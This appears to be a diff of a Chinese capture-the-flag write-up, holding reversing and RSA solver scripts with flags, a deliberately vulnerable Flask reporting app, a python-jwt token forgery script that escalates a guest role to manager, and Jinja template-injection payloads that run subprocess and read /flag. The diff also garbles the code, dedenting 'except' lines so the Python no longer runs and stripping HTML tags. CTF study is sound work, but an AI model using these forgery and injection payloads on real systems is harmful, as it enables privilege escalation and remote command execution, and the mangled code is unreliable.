@@ -114,11 +114,6 @@ for i in range(39):
     c = byte_4060[i] ^ byte_4020[i]
     flag += chr(c) if0x20 <= c <= 0x7Eelse'.'
 print(flag)
-```
-
-
-
-```
 def ror(b, s):
     s %= 8
     return ((b >> s) | (b << (8 - s))) & 0xFF
@@ -136,17 +131,7 @@ for round in range(2, -1, -1):
         enc[i] = ror(enc[i], round + 1)
 
 print(''.join(chr(x) for x in enc))
-```
-
-
-
-```
 ./challenge < flag.bin
-```
-
-
-
-```
 def ror(b, s):
     s %= 8
     return ((b >> s) | (b << (8 - s))) & 0xFF
@@ -167,11 +152,6 @@ for round in range(2, -1, -1):
 print(''.join(chr(x) for x in enc))
 
 # flag{Th1s_1s_My_S1mpl3_Fl4g_f0r_CTF}
-```
-
-
-
-```
 from Crypto.Util.number import *
 from flag import flag
 
@@ -196,11 +176,6 @@ c =  45694799852273510050637859951350670327203785177628959325366597667506207159
 n =  4886488210976342084709096740163565218271041981736454979038282347346782586289498952728993072164156014308360739234075655553608312787941314479273226321644139
 e =  69226245919249557284362852197482448692961051575353210229155811272280423133461036546714805862880491826820998627526504053578014404131806296413582035968459012627551356400980693085358304615504234701685438459878813948020276726029476169237998655600278740940333141714850818687244699016224065398835277355085190021649464175896949882797374785669601481278636634767170296279707462651980061069176263757678901169598571771064631589157944694386675873019622753613139854047148807223799604198162775252510345809461265433420840521382586775251192251617135265179686326411651203242167525116012981497530813723052998392487942518359093767791
 """
-```
-
-
-
-```
 from Crypto.Util.number import long_to_bytes
 
 c = 4569479985227351005063785995135067032720378517762895932536659766750620715910605148533244779487921315047171013575610160508152407529266889273867903198797261
@@ -234,11 +209,6 @@ for k,d in convs(cf(e,den)):
         break
 
 # flag{fc3f4ce8dc3eaca8807812b8c0435cd4}
-```
-
-
-
-```
 from Crypto.Util.number import *
 import random, gmpy2
 from flag import flag
@@ -287,11 +257,6 @@ RSAEncryptor()
 # e=65537
 # g=111684314954681193048509857146926361842347687090472066568935363273885037337811
 # enc=12643371534391958135236095622827564261907624974618206428861944879376238094269846145595767463703827586815298891013812360542402349502974102836324041194817837979051818191875704215738686008582339520686043633518534916826599993931844826243220488649199690449278527396151017995036899907805560418507134336681609833081538329779248
-```
-
-
-
-```
 from math import isqrt, gcd
 from Crypto.Util.number import long_to_bytes, inverse
 
@@ -332,11 +297,6 @@ m = pow(enc, d, N)
 print(long_to_bytes(m))
               
 # flag{d39691fd3467e11c5c4443e65a93ab37}
-```
-
-
-
-```
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
@@ -464,13 +424,15 @@ def verify_token():
                 'valid': True,
                 'payload': payload
             })
-        except Exception as e:
+        
+except Exception as e:
             return jsonify({
                 'valid': False, 
                 'message': f'Token验证失败: {str(e)}'
             }), 401
             
-    except Exception as e:
+    
+except Exception as e:
         return jsonify({
             'valid': False,
             'message': f'请求处理失败: {str(e)}'
@@ -500,10 +462,12 @@ def get_companies():
             else:
                 return jsonify({'error': '权限不足'}), 403
                 
-        except Exception as e:
+        
+except Exception as e:
             return jsonify({'error': f'Token验证失败: {str(e)}'}), 401
             
-    except Exception as e:
+    
+except Exception as e:
         return jsonify({'error': f'请求处理失败: {str(e)}'}), 500
 
 @app.route('/api/report/generate', methods=['POST'])
@@ -555,39 +519,34 @@ def generate_report():
 <html>
 <head>
     <title>{custom_title}</title>
-    <style>
-        body {{ font-family: SimSun, serif; margin: 40px; }}
-        .header {{ text-align: center; border-bottom: 2px solid #8B4513; padding-bottom: 20px; }}
-        .content {{ margin-top: 30px; }}
-        .signature {{ margin-top: 50px; text-align: right; }}
-    </style>
+    
 </head>
-<body>
-    <div class="header">
+
+    
         <h1>{custom_title}</h1>
-        <p>企业监管报告</p>
-    </div>
+        企业监管报告
+    
     
-    <div class="content">
+    
         <h2>企业基本信息</h2>
-        <p><strong>企业名称：</strong>{company['name']}</p>
-        <p><strong>许可证号：</strong>{company['license']}</p>
-        <p><strong>运营状态：</strong>{company['status']}</p>
-        <p><strong>所在地区：</strong>{company['location']}</p>
-        <p><strong>主要产品：</strong>{', '.join(company['products'])}</p>
+        企业名称：{company['name']}
+        许可证号：{company['license']}
+        运营状态：{company['status']}
+        所在地区：{company['location']}
+        主要产品：{', '.join(company['products'])}
         
         <h2>自定义报告内容</h2>
-        <div>
+        
             {report_template}
-        </div>
+        
         
-        <div class="signature">
-            <p>报告生成人：{user_name}</p>
-            <p>所属部门：{user_dept}</p>
-            <p>生成时间：{{{{ "现在的时间" }}}}</p>
-        </div>
-    </div>
-</body>
+        
+            报告生成人：{user_name}
+            所属部门：{user_dept}
+            生成时间：{{{{ "现在的时间" }}}}
+        
+    
+
 </html>
                 """
                 
@@ -599,7 +558,8 @@ def generate_report():
                         'report_html': rendered_html,
                         'message': '报告生成成功'
                     })
-                except Exception as e:
+                
+except Exception as e:
                     return jsonify({
                         'error': f'模板渲染失败: {str(e)}',
                         'hint': '检查模板语法是否正确'
@@ -608,8 +568,8 @@ def generate_report():
                 
                 default_template = f"""
                 <h3>监管结论</h3>
-                <p>经过全面检查，{company['name']} 企业运营状况良好，符合国家相关规定。</p>
-                <p>建议继续保持规范经营，定期接受监管部门检查。</p>
+                经过全面检查，{company['name']} 企业运营状况良好，符合国家相关规定。
+                建议继续保持规范经营，定期接受监管部门检查。
                 """
                 
                 template_content = f"""
@@ -617,35 +577,30 @@ def generate_report():
 <html>
 <head>
     <title>{custom_title}</title>
-    <style>
-        body {{ font-family: SimSun, serif; margin: 40px; }}
-        .header {{ text-align: center; border-bottom: 2px solid #8B4513; padding-bottom: 20px; }}
-        .content {{ margin-top: 30px; }}
-        .signature {{ margin-top: 50px; text-align: right; }}
-    </style>
+    
 </head>
-<body>
-    <div class="header">
+
+    
         <h1>{custom_title}</h1>
-        <p>企业监管报告</p>
-    </div>
+        企业监管报告
+    
     
-    <div class="content">
+    
         <h2>企业基本信息</h2>
-        <p><strong>企业名称：</strong>{company['name']}</p>
-        <p><strong>许可证号：</strong>{company['license']}</p>
-        <p><strong>运营状态：</strong>{company['status']}</p>
-        <p><strong>所在地区：</strong>{company['location']}</p>
-        <p><strong>主要产品：</strong>{', '.join(company['products'])}</p>
+        企业名称：{company['name']}
+        许可证号：{company['license']}
+        运营状态：{company['status']}
+        所在地区：{company['location']}
+        主要产品：{', '.join(company['products'])}
         
         {default_template}
         
-        <div class="signature">
-            <p>报告生成人：{user_name}</p>
-            <p>所属部门：{user_dept}</p>
-        </div>
-    </div>
-</body>
+        
+            报告生成人：{user_name}
+            所属部门：{user_dept}
+        
+    
+
 </html>
                 """
                 
@@ -655,10 +610,12 @@ def generate_report():
                     'message': '默认报告生成成功'
                 })
                 
-        except Exception as e:
+        
+except Exception as e:
             return jsonify({'error': f'Token验证失败: {str(e)}'}), 401
             
-    except Exception as e:
+    
+except Exception as e:
         return jsonify({'error': f'请求处理失败: {str(e)}'}), 500
 
 @app.errorhandler(404)
@@ -671,26 +628,11 @@ def internal_error(error):
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-```
-
-
-
-```
 Flask==2.3.3
 python-jwt==3.3.3
 jwcrypto==1.5.0
 Werkzeug==2.3.7
-```
-
-
-
-```
 eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9.cPXxqD1p4DfCZPkRrWIjiY_t6QkkJEu8N98c5bwnv9aF8Ynm6fwZ8eA43kw-xdjQATxrJ6MzQp60J8YnjVfQnKLDwhSrpcJubE3XkkDFoKk19x_syqKiVqB7LHBjTCteUhdXjjCt7zslEppcZdhzcznPgJewghv--6pDoP3gIXfhWmbcG48zW9o-5aeKZmt4FUdmsE6_okLfRBQNlwUXvubaHmdbRJqTwHthdtC6XokIGeqE3P3w0qgCpZkMiIT9SdeWqbKMIUyHdL_O8PbIq0-ZcOnpsdZL5pHAkX0sqFzi-Hjn2BoyDF3EzoevS6QS9CjyW0VYog8bvsrHvTvYgQ
-```
-
-
-
-```
 from json import loads, dumps
 from python_jwt import base64url_decode, base64url_encode
 
@@ -706,33 +648,13 @@ fake_payload_b64 = base64url_encode(dumps(payload, separators=(',', ':')))
 print('{"' + header_b64 + '.' + fake_payload_b64 + '.":"","protected":"' + header_b64 + '", "payload":"' + payload_b64 + '","signature":"' + signature_b64 + '"}')
 
 # {"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Im1hbmFnZXIiLCJ1c2VybmFtZSI6Imd1ZXN0In0.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9","signature":"cPXxqD1p4DfCZPkRrWIjiY_t6QkkJEu8N98c5bwnv9aF8Ynm6fwZ8eA43kw-xdjQATxrJ6MzQp60J8YnjVfQnKLDwhSrpcJubE3XkkDFoKk19x_syqKiVqB7LHBjTCteUhdXjjCt7zslEppcZdhzcznPgJewghv--6pDoP3gIXfhWmbcG48zW9o-5aeKZmt4FUdmsE6_okLfRBQNlwUXvubaHmdbRJqTwHthdtC6XokIGeqE3P3w0qgCpZkMiIT9SdeWqbKMIUyHdL_O8PbIq0-ZcOnpsdZL5pHAkX0sqFzi-Hjn2BoyDF3EzoevS6QS9CjyW0VYog8bvsrHvTvYgQ"}
-```
-
-
-
-```
 {% set sp = config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess') %}
 {% set r = sp.run(['ls','-la','/'], capture_output=True, text=True) %}
 {% print(r.stdout) %}
-```
-
-
-
-```
 {% set o = config.__class__.__init__.__globals__['__builtins__']['open'] %}
 {% set f = o('/flag').read() %}
 {% print(f) %}
-```
-
-
-
-```
 {"company_id": 1, "template": "{% set open_func = config.__class__.__init__.__globals__['__builtins__']['open'] %}{% set flag_content = open_func('/flag').read() %}Flag: {% print(flag_content) %}", "title": "Flag"}
-```
-
-
-
-```
 line  CODE  JT   JF      K
 =================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
